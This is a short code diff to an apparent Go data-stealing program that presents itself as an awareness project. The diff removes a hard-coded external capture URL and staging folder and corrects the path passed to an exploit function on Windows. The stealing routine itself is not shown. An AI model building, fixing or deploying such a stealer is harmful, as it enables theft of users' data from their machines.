@@ -33,9 +33,7 @@ This project only purpose is to raise awareness on how easily it is to steal you
 
 Be mindfull of what you download and execute.
 
-url: https://miniprojectonnetworksecurity.free.beeceptor.com
-
-folder: /tmp/trust_me/
+url: `
 
 func main() {
 	switch runtime.GOOS {
@@ -46,7 +44,7 @@ func main() {
 			os.Exit(0)
 		}
 		tmp_folder := user.HomeDir + "\\AppData\\Local\\Temp\\" + tmp_folder_name + "\\"
-		if exploit(mac_path, tmp_folder, true) {
+		if exploit(win_path, tmp_folder, true) {
 
 			cmd := exec.Command("cmd", "/C", "start", tmp_folder)
 			cmd.Run()
